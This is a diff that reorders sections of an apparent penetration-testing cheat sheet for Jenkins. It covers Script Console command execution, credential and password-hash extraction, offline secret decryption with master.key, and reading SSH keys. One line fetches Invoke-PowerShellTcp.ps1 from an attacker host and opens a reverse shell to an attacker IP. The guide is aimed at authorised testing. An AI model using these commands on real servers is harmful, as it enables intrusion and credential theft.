@@ -52,14 +52,7 @@ An open-source automation server written in Java that helps developers build and
   </code></pre>
 * We can also use `exploit/multi/http/jenkins_script_console` Metasploit Module
 
-### Project Build Configuration
-
-* Add a build step, choose **"Execute Windows Batch Command"**
-* `powershell -c <command>`
-* `powershell -eX (iwr -UseBasicParsing http://<ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress <attacker-IP> -Port <attacker-port>`
-* [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
-
-## Runtime Inventory
+#### Runtime Inventory
 
 * **Run on controller:** discover real paths/versions before using filesystem or plugin-specific examples.
 
@@ -85,7 +78,7 @@ controller.nodes.each { node ->
 
 * Confirm effective OS identity using `id` / `whoami`; JVM properties alone do not describe the complete security token.
 
-## Shell Command Variants
+#### Shell Command Variants
 
 * **Script Console:** choose **one** command definition, then append the shared runner in the same submission.
 * **Linux:** explicit shell permits pipes/redirection; plain string `.execute()` does not.
@@ -135,7 +128,7 @@ println "completed=${finished}; exit=${process.isAlive() ? 'still running' : pro
 * A timeout may leave child processes or incomplete output; stop test children explicitly. Do not use this runner for long-lived listeners.
 * `SeImpersonatePrivilege` is a lead, not guaranteed elevation; OS build, service configuration, token context, and tool compatibility still matter.
 
-### Execute on a Selected Agent
+##### Execute on a Selected Agent
 
 * **Need:** controller Script Console access, an in-scope online agent, and a working channel. Select the actual node name.
 
@@ -157,7 +150,7 @@ println RemotingDiagnostics.executeGroovy(agentScript, computer.channel)
 
 * Controller files, credentials, and OS privileges are not automatically the agent's. Repeat relevant checks in the intended context.
 
-## Remote Script Console
+#### Remote Script Console
 
 * **Host Bash/curl:** submit a reviewed local Groovy script. Requires `Overall/Administer`; this is not an authentication bypass.
 * `--fail-with-body` requires curl 7.76+; use `--fail` on older versions if response-body preservation is unnecessary.
@@ -190,12 +183,12 @@ java -jar jenkins-cli.jar -s '<jenkins-base-url>/' -auth @'<protected-auth-file>
 * The CLI example uses Bash input redirection; check `help groovy` for the installed version. Delete the temporary auth file after use.
 * References: [remote console](https://www.jenkins.io/doc/book/managing/script-console/#remote-access), [CSRF/session rules](https://www.jenkins.io/doc/book/security/csrf-protection/), [CLI](https://www.jenkins.io/doc/book/managing/cli/).
 
-## Credential Stores and Types
+#### Credential Stores and Types
 
 * **Need:** controller Script Console and the Credentials plugin. Enumerate metadata first; inspect secret values only for approved IDs.
 * A root-context lookup does not cover every folder/user store. Domains, authentication, and provider context affect results; this administrative inventory does not simulate a low-privilege job.
 
-### Inventory a Store Context
+##### Inventory a Store Context
 
 ```groovy
 import com.cloudbees.plugins.credentials.CredentialsProvider
@@ -227,7 +220,7 @@ def context = Jenkins.get().getItemByFullName('<folder-path>')
 def context = hudson.model.User.getById('<user-id>', false)
 ```
 
-### Inspect One Approved Credential
+##### Inspect One Approved Credential
 
 * Use the context, domain name, and ID from inventory. For the global domain, leave `domainName` empty.
 * Missing optional credential plugins are tolerated by dynamic type checks. Unknown/external providers need their own supported APIs.
@@ -296,77 +289,7 @@ if (isType('com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCre
 * External/hardware-backed keystores may not support export. Standard file/keystore examples are not universal provider dump methods.
 * APIs: [stores and lookup contexts](https://javadoc.jenkins.io/plugin/credentials/com/cloudbees/plugins/credentials/CredentialsProvider.html), [secret files](https://javadoc.jenkins.io/plugin/plain-credentials/org/jenkinsci/plugins/plaincredentials/FileCredentials.html), [certificate credentials](https://javadoc.jenkins.io/plugin/credentials/com/cloudbees/plugins/credentials/common/StandardCertificateCredentials.html).
 
-## Local User Password Hashes
-
-* **Scope:** approved local-user records only. LDAP/SSO passwords are not recovered by these examples; a Jenkins user record need not contain a local password.
-* Preserve the complete stored hash/prefix. Password hashes are not decryptable with `hudson.util.Secret`; do not assume every version/configuration uses the same hash scheme.
-
-### Script Console: Linux or Windows
-
-* **Need:** compatible Jenkins user APIs and persisted user configuration. XML parsing avoids shell quoting, underscore-based username guesses, and `grep`/`cut` truncation.
-
-```groovy
-import hudson.model.User
-import groovy.util.XmlSlurper
-
-def allowedIds = ['<test-user-id>']
-User.getAll().findAll { allowedIds.contains(it.id) }.each { user ->
-  def folder = user.getUserFolder()
-  if (folder == null) {
-    println "${user.id}: no persisted folder"
-    return
-  }
-  def configFile = new File(folder, 'config.xml')
-  if (!configFile.isFile()) {
-    println "${user.id}: no config file"
-    return
-  }
-  def config = new XmlSlurper().parse(configFile)
-  def hash = config.properties.'hudson.security.HudsonPrivateSecurityRealm_-Details'.passwordHash.text()
-  println "${user.id}:${hash ?: '(no local password hash)'}"
-}
-```
-
-* `getUserFolder()` is available from Jenkins 2.129; older releases need a verified filesystem mapping. Check the real object for null, not `"$folder"`.
-
-### Direct Filesystem: PowerShell
-
-* **Run on host:** approved filesystem copy or authorized local access. Set the actual Jenkins home; do not infer IDs from directory names.
-
-```powershell
-$jenkinsHome = '<jenkins-home-or-copy>'
-$allowedIds = @('<test-user-id>')
-Get-ChildItem -LiteralPath (Join-Path $jenkinsHome 'users') -Directory | ForEach-Object {
-  $configPath = Join-Path $_.FullName 'config.xml'
-  if (-not (Test-Path -LiteralPath $configPath -PathType Leaf)) { return }
-  [xml]$config = Get-Content -LiteralPath $configPath -Raw
-  $idNode = $config.SelectSingleNode('/user/id')
-  if ($null -eq $idNode) {
-    Write-Warning "No stored ID in $configPath; resolve the user mapping first"
-    return
-  }
-  $userId = $idNode.InnerText
-  if ($allowedIds -cnotcontains $userId) { return }
-  $hashNode = $config.SelectSingleNode('/user/properties/hudson.security.HudsonPrivateSecurityRealm_-Details/passwordHash')
-  if ($null -ne $hashNode) {
-    Write-Output "${userId}:$($hashNode.InnerText)"
-  } else {
-    Write-Output "${userId}: No local password hash"
-  }
-}
-```
-
-### Direct Filesystem: Linux
-
-* **Need:** XMLStarlet and a known in-scope user configuration file. This reads one record, not every user.
-
-```sh
-xmlstarlet sel -t -v '/user/id' -o ':' -v '/user/properties/hudson.security.HudsonPrivateSecurityRealm_-Details/passwordHash' -n '<approved-user-config.xml>'
-```
-
-* Missing ID/hash: inspect the version's XML/user mapping; do not derive identity by splitting the folder name. [Jenkins user API](https://javadoc.jenkins.io/hudson/model/User.html).
-
-## Secret API Round Trip
+##### Secret API Round Trip
 
 * **Controller Script Console:** use synthetic data for an encryption/decryption control. This does not alter a stored credential.
 
@@ -394,23 +317,40 @@ println recovered.getPlainText()
 * `Secret.fromString` falls back to treating input as plaintext if decryption fails; it is not a reliable decryption-success check.
 * `SecretBytes`, password hashes, and external-provider references are different formats. [Secret API](https://javadoc.jenkins.io/hudson/util/Secret.html).
 
-## Offline Secret Decryption
+#### Local User Password Hashes
 
-* **Tool:** [hoto/jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor) is **Go**, not Python. Use a reviewed release compatible with the captured format.
-* **Required matching artifacts:** encrypted credential XML, `secrets/master.key`, and `secrets/hudson.util.Secret` from the same key state. Work on protected copies; never replace live keys for this test.
-* Global credentials commonly use `credentials.xml`; folder credentials may be in the folder's `config.xml`. Locate the actual store first.
-* A changed/lost key is not bypassed by offline mode; historical ciphertext requires its corresponding key material.
+* **Scope:** approved local-user records only. LDAP/SSO passwords are not recovered by these examples; a Jenkins user record need not contain a local password.
+* Preserve the complete stored hash/prefix. Password hashes are not decryptable with `hudson.util.Secret`; do not assume every version/configuration uses the same hash scheme.
 
-```sh
-./jenkins-credentials-decryptor --help
-./jenkins-credentials-decryptor --version
-./jenkins-credentials-decryptor -m ./master.key -s ./hudson.util.Secret -c ./credentials.xml -o json
-./jenkins-credentials-decryptor -m ./master.key -s ./hudson.util.Secret -c ./folder-config.xml -o json
+**Script Console: Linux or Windows**
+
+* **Need:** compatible Jenkins user APIs and persisted user configuration. XML parsing avoids shell quoting, underscore-based username guesses, and `grep`/`cut` truncation.
+
+```groovy
+import hudson.model.User
+import groovy.util.XmlSlurper
+
+def allowedIds = ['<test-user-id>']
+User.getAll().findAll { allowedIds.contains(it.id) }.each { user ->
+  def folder = user.getUserFolder()
+  if (folder == null) {
+    println "${user.id}: no persisted folder"
+    return
+  }
+  def configFile = new File(folder, 'config.xml')
+  if (!configFile.isFile()) {
+    println "${user.id}: no config file"
+    return
+  }
+  def config = new XmlSlurper().parse(configFile)
+  def hash = config.properties.'hudson.security.HudsonPrivateSecurityRealm_-Details'.passwordHash.text()
+  println "${user.id}:${hash ?: '(no local password hash)'}"
+}
 ```
 
-* The last two lines are separate global/folder input variants. The tool's documented compatibility is limited; verify a known test secret and handle unsupported credential formats separately.
+* `getUserFolder()` is available from Jenkins 2.129; older releases need a verified filesystem mapping. Check the real object for null, not `"$folder"`.
 
-## SSH Files Outside the Credential Store
+#### SSH Files Outside the Credential Store
 
 * **Script Console:** inspect the selected process's home first. The service-account path may differ from `/home/jenkins`; the credentials plugin may hold keys elsewhere.
 
@@ -434,7 +374,14 @@ println targetFile.bytes.encodeBase64().toString()
 
 * Key presence does not establish access to a remote host. Test key use only against explicitly authorized destinations; Base64 output remains sensitive.
 
-## Build Execution Variants
+### Project Build Configuration
+
+* Add a build step, choose **"Execute Windows Batch Command"**
+* `powershell -c <command>`
+* `powershell -eX (iwr -UseBasicParsing http://<ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress <attacker-IP> -Port <attacker-port>`
+* [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
+**Build Execution Variants**
 
 * **Need:** approved disposable job, configure/build permissions, and a permitted online agent. Build steps execute on the allocated node, not necessarily the controller.
 * **Freestyle Linux, Execute shell:**
@@ -476,7 +423,64 @@ node('<test-agent-label>') {
 * Pipeline Groovy is not the unrestricted Script Console; sandbox/script-approval rules apply. OS steps still use the agent account's permissions.
 * Do not print all environment variables or bound production credentials. Review results, then restore/delete only the disposable test job and its artifacts.
 
-### Optional Windows Account Test
+### Filesystem and Host Access
+
+#### Local Hashes from Filesystem
+
+**Direct Filesystem: PowerShell**
+
+* **Run on host:** approved filesystem copy or authorized local access. Set the actual Jenkins home; do not infer IDs from directory names.
+
+```powershell
+$jenkinsHome = '<jenkins-home-or-copy>'
+$allowedIds = @('<test-user-id>')
+Get-ChildItem -LiteralPath (Join-Path $jenkinsHome 'users') -Directory | ForEach-Object {
+  $configPath = Join-Path $_.FullName 'config.xml'
+  if (-not (Test-Path -LiteralPath $configPath -PathType Leaf)) { return }
+  [xml]$config = Get-Content -LiteralPath $configPath -Raw
+  $idNode = $config.SelectSingleNode('/user/id')
+  if ($null -eq $idNode) {
+    Write-Warning "No stored ID in $configPath; resolve the user mapping first"
+    return
+  }
+  $userId = $idNode.InnerText
+  if ($allowedIds -cnotcontains $userId) { return }
+  $hashNode = $config.SelectSingleNode('/user/properties/hudson.security.HudsonPrivateSecurityRealm_-Details/passwordHash')
+  if ($null -ne $hashNode) {
+    Write-Output "${userId}:$($hashNode.InnerText)"
+  } else {
+    Write-Output "${userId}: No local password hash"
+  }
+}
+```
+
+**Direct Filesystem: Linux**
+
+* **Need:** XMLStarlet and a known in-scope user configuration file. This reads one record, not every user.
+
+```sh
+xmlstarlet sel -t -v '/user/id' -o ':' -v '/user/properties/hudson.security.HudsonPrivateSecurityRealm_-Details/passwordHash' -n '<approved-user-config.xml>'
+```
+
+* Missing ID/hash: inspect the version's XML/user mapping; do not derive identity by splitting the folder name. [Jenkins user API](https://javadoc.jenkins.io/hudson/model/User.html).
+
+#### Offline Secret Decryption
+
+* **Tool:** [hoto/jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor) is **Go**, not Python. Use a reviewed release compatible with the captured format.
+* **Required matching artifacts:** encrypted credential XML, `secrets/master.key`, and `secrets/hudson.util.Secret` from the same key state. Work on protected copies; never replace live keys for this test.
+* Global credentials commonly use `credentials.xml`; folder credentials may be in the folder's `config.xml`. Locate the actual store first.
+* A changed/lost key is not bypassed by offline mode; historical ciphertext requires its corresponding key material.
+
+```sh
+./jenkins-credentials-decryptor --help
+./jenkins-credentials-decryptor --version
+./jenkins-credentials-decryptor -m ./master.key -s ./hudson.util.Secret -c ./credentials.xml -o json
+./jenkins-credentials-decryptor -m ./master.key -s ./hudson.util.Secret -c ./folder-config.xml -o json
+```
+
+* The last two lines are separate global/folder input variants. The tool's documented compatibility is limited; verify a known test secret and handle unsupported credential formats separately.
+
+#### Optional Windows Account Test
 
 * **Separate approval required:** state-changing OS test, not a Jenkins prerequisite or automatic privilege escalation.
 * **Run directly in an interactive, already elevated Windows PowerShell console:** 64-bit `Microsoft.PowerShell.LocalAccounts` module, local accounts supported, and a fresh test name. This is not a Script Console prompt workflow.
@@ -502,7 +506,7 @@ Remove-LocalUser -Name $testUser
 Remove-Variable testPassword -ErrorAction SilentlyContinue
 ```
 
-## Test Cleanup
+### Test Cleanup
 
 * Stop test processes/listeners; remove only test-created files, jobs, accounts, and temporary authentication files.
 * Restore job configuration and permissions changed during testing; coordinate rotation/revocation of exposed test secrets.
